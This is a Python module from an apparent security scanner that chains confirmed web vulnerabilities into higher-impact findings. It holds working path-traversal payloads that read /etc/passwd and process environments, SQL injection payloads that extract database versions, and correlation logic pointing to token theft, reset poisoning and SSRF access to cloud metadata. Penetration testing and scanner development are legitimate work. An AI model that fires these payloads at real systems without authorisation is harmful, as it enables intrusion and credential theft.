"""Chain engine: use discovered vulnerabilities to attack further.

Two kinds of chaining:
  1) Active escalation — a confirmed primitive is pushed further with additional
     read-only probes (LFI → read more files; SQLi → extract DB version).
  2) Correlation — combining separate findings into a higher-impact chain
     (open redirect + OAuth → token theft; XSS + non-HttpOnly cookie → session
     theft; host-header reflection + reset endpoint → reset poisoning).

All escalations remain read-only / non-destructive.
"""
from __future__ import annotations

import re

from core.result import Finding, Severity
from core.injection_points import InjectionPoint, send

# ---- Active escalation payloads -------------------------------------------
LFI_FILES = [
    ("../../../../../../etc/hosts", re.compile(r"localhost|127\.0\.0\.1")),
    ("../../../../../../proc/self/environ", re.compile(r"PATH=|HOME=|USER=")),
    ("../../../../../../etc/passwd", re.compile(r"root:.*?:0:0:")),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", re.compile(r"\[(extensions|fonts)\]", re.I)),
    ("../../../../../../var/log/apache2/access.log", re.compile(r"GET |POST |HTTP/1")),
]

SQLI_VERSION_PAYLOADS = [
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,version()),1)-- -",
    "' AND 1=CAST(version() AS int)-- -",
    "' UNION SELECT @@version-- -",
]
VERSION_RE = re.compile(r"(MariaDB|MySQL|PostgreSQL|Microsoft SQL Server|SQLite)[^\n<]{0,40}"
                        r"|~([0-9]+\.[0-9]+\.[0-9]+[\w.\-]*)|([0-9]+\.[0-9]+\.[0-9]+)[^\n<]{0,20}(MariaDB|MySQL)",
                        re.IGNORECASE)


def _rebuild_point(d: dict) -> InjectionPoint:
    return InjectionPoint(method=d.get("method", "GET"), base_url=d["base_url"],
                          param=d["param"], base_params=d.get("base_params", {}),
                          where=d.get("where", "query"))


def _escalate_lfi(ctx, f: Finding) -> list[Finding]:
    pt = _rebuild_point(f.extra["chain"])
    out: list[Finding] = []
    for payload, sig in LFI_FILES:
        if ctx.should_stop():
            break
        r = send(ctx, pt, payload)
        if r is None:
            continue
        if sig.search(r.text or ""):
            out.append(Finding(
                module_id="chain", title=f"LFI escalation: read '{payload.split('/')[-1] or payload}'",
                severity=Severity.HIGH, url=pt.base_url, confidence="Confirmed",
                description=("Building on the confirmed path traversal, an additional local file was read, "
                             "demonstrating broader filesystem access."),
                evidence=f"Payload: {payload}\nMatched: {sig.pattern[:40]}",
                request=f"{pt.method} {pt.base_url}  ({pt.param}={payload})",
                impact="설정/자격증명/로그 파일 노출로 확대 → 정보 유출 및 추가 침투 가능.",
                remediation="Canonicalize and confine file access to an allow-listed directory.",
                extra={"chained_from": f.title}))
    return out


def _escalate_sqli(ctx, f: Finding) -> list[Finding]:
    pt = _rebuild_point(f.extra["chain"])
    base_val = pt.base_params.get(pt.param) or "1"
    for payload in SQLI_VERSION_PAYLOADS:
        if ctx.should_stop():
            break
        r = send(ctx, pt, base_val + payload)
        if r is None:
            continue
        m = VERSION_RE.search(r.text or "")
        if m:
            return [Finding(
                module_id="chain", title="SQLi escalation: database version extracted",
                severity=Severity.HIGH, url=pt.base_url, confidence="Confirmed",
                description=("Building on the confirmed SQL injection, the database version was extracted, "
                             "confirming data-exfiltration capability."),
                evidence=f"Extracted: {m.group(0)[:80]}\nPayload: {payload}",
                request=f"{pt.method} {pt.base_url}  ({pt.param}=<version payload>)",
                impact="DB 버전/구조 열람 확인 → 전체 데이터 열람·조작으로 확대 가능.",
                remediation="Use parameterized queries; least-privilege DB account.",
                extra={"chained_from": f.title})]
    return []


# ---- Correlation helpers ---------------------------------------------------
def _has(findings, module_ids=None, title_contains=None) -> Finding | None:
    for f in findings:
        if module_ids and f.module_id not in module_ids:
            continue
        if title_contains and title_contains.lower() not in f.title.lower():
            continue
        return f
    return None


def _correlate(findings: list[Finding]) -> list[Finding]:
    out: list[Finding] = []

    # open redirect + OAuth/SSO -> token theft / account takeover
    orf = _has(findings, module_ids={"open_redirect"})
    oauth = _has(findings, module_ids={"oauth_misconfig"}) or _has(findings, title_contains="SSO")
    if orf and oauth:
        out.append(Finding(
            module_id="chain", title="Chain: open redirect + OAuth → token theft (account takeover)",
            severity=Severity.HIGH, url=orf.url, confidence="Tentative",
            description="An open redirect combined with an OAuth flow can steal authorization codes/tokens "
                        "by redirecting the victim to an attacker host after authentication.",
            evidence=f"Open redirect: {orf.url}\nOAuth signal: {oauth.title}",
            impact="OAuth 코드/토큰 탈취 → 계정 탈취(~$20,000급).",
            remediation="Strictly allow-list redirect and redirect_uri targets.",
            extra={"chained_from": [orf.title, oauth.title]}))

    # XSS + non-HttpOnly session cookie -> session theft
    xss = _has(findings, module_ids={"xss_reflected", "xss_dom", "csti"})
    cookie = _has(findings, module_ids={"cookies"}, title_contains="HttpOnly")
    if xss and cookie:
        out.append(Finding(
            module_id="chain", title="Chain: XSS + non-HttpOnly cookie → session theft",
            severity=Severity.HIGH, url=xss.url, confidence="Tentative",
            description="Script execution can read a cookie that lacks HttpOnly, enabling session hijacking.",
            evidence=f"XSS: {xss.title}\nCookie: {cookie.title}",
            impact="세션 쿠키 탈취 → 계정 탈취.",
            remediation="Fix the XSS and set HttpOnly (and SameSite/Secure) on session cookies.",
            extra={"chained_from": [xss.title, cookie.title]}))

    # host-header reflection + password reset endpoint -> reset poisoning
    host = _has(findings, module_ids={"host_header"}) or _has(findings, title_contains="host-header")
    reset = _has(findings, title_contains="reset") or _has(findings, title_contains="Password reset")
    if host and reset:
        out.append(Finding(
            module_id="chain", title="Chain: host-header injection + reset endpoint → reset poisoning (ATO)",
            severity=Severity.HIGH, url=reset.url, confidence="Tentative",
            description="A reflected Host header on a password-reset flow can deliver reset links pointing to "
                        "an attacker domain, capturing victims' reset tokens.",
            evidence=f"Host header: {host.title}\nReset: {reset.title}",
            impact="피해자 비밀번호 재설정 토큰 탈취 → 계정 탈취.",
            remediation="Build reset URLs from a trusted base; validate Host.",
            extra={"chained_from": [host.title, reset.title]}))

    # Exposed .git -> full source disclosure
    git = next((f for f in findings if f.module_id.startswith("exp_git")), None)
    if git:
        out.append(Finding(
            module_id="chain", title="Chain: exposed .git → full source code disclosure",
            severity=Severity.HIGH, url=git.url, confidence="Firm",
            description="An exposed .git directory allows reconstructing the full source tree "
                        "(git-dumper), then mining it for hardcoded secrets and logic flaws.",
            evidence=f"From: {git.title}",
            impact="소스 전체 복원 → 하드코딩 시크릿·로직 취약점 2차 발굴.",
            remediation="Block access to .git; scrub secrets from history.",
            extra={"chained_from": [git.title]}))

    # Actuator env/heapdump -> credential extraction
    act = next((f for f in findings if f.module_id in ("mc_actuator_env", "mc_actuator_heapdump", "tech_spring_cloud_env")), None)
    if act:
        out.append(Finding(
            module_id="chain", title="Chain: Actuator/Spring env → credential extraction",
            severity=Severity.HIGH, url=act.url, confidence="Tentative",
            description="Exposed environment/heapdump often contains DB passwords, API keys and session "
                        "material usable to pivot deeper or take over accounts.",
            evidence=f"From: {act.title}",
            impact="자격증명 추출 → 내부 이동/계정 탈취.",
            remediation="Secure actuator endpoints; rotate exposed secrets.",
            extra={"chained_from": [act.title]}))

    # OpenAPI/Swagger -> endpoint authz/IDOR testing
    api = next((f for f in findings if f.module_id in ("tech_swagger_json", "tech_swagger_ui", "graphql") or "swagger" in f.title.lower() or "openapi" in f.title.lower()), None)
    if api:
        out.append(Finding(
            module_id="chain", title="Chain: API spec exposed → test every endpoint for authz/IDOR",
            severity=Severity.INFO, url=api.url, confidence="Firm",
            description="A published API schema maps all operations; systematically test each for broken "
                        "authorization, IDOR, and mass assignment.",
            evidence=f"From: {api.title}",
            remediation="Enforce authz on every endpoint regardless of documentation.",
            extra={"chained_from": [api.title]}))

    # Any exposed panel -> default creds / known CVE
    panel = next((f for f in findings if f.module_id.startswith("panel_")), None)
    if panel:
        out.append(Finding(
            module_id="chain", title="Chain: exposed panel → default creds & known-CVE testing",
            severity=Severity.MEDIUM, url=panel.url, confidence="Tentative",
            description="An exposed management panel should be tested (in scope) for default/weak credentials "
                        "and product-specific CVEs matching its version.",
            evidence=f"From: {panel.title}",
            impact="기본 자격/취약 CVE로 콘솔 장악 → 서버 장악.",
            remediation="Restrict access; change defaults; patch.",
            extra={"chained_from": [panel.title]}))

    # SSRF confirmed -> cloud metadata pivot note
    ssrf = _has(findings, module_ids={"ssrf"}, title_contains="confirmed")
    if ssrf:
        out.append(Finding(
            module_id="chain", title="Chain: SSRF → cloud metadata / internal pivot",
            severity=Severity.HIGH, url=ssrf.url, confidence="Tentative",
            description="Confirmed SSRF can often reach cloud metadata (169.254.169.254) or internal services. "
                        "Test (in scope) for credential theft and internal access.",
            evidence=f"SSRF: {ssrf.title}",
            impact="클라우드 메타데이터/내부 서비스 접근 → 자격증명 탈취·내부 침투.",
            remediation="Block link-local/internal ranges; require IMDSv2; egress filtering.",
            extra={"chained_from": [ssrf.title]}))

    return out


def run_chains(ctx, findings: list[Finding], on_finding) -> list[Finding]:
    """Run active escalations + correlations. Streams new findings via on_finding."""
    new: list[Finding] = []

    # Active escalations from findings that carry a chain descriptor.
    for f in list(findings):
        if ctx.should_stop():
            break
        chain = f.extra.get("chain") if isinstance(f.extra, dict) else None
        if not chain:
            continue
        try:
            if chain.get("type") == "lfi":
                new += _escalate_lfi(ctx, f)
            elif chain.get("type") == "sqli":
                new += _escalate_sqli(ctx, f)
        except Exception:
            continue

    # Correlations across everything found so far.
    try:
        new += _correlate(findings + new)
    except Exception:
        pass

    for f in new:
        on_finding(f)
    return new
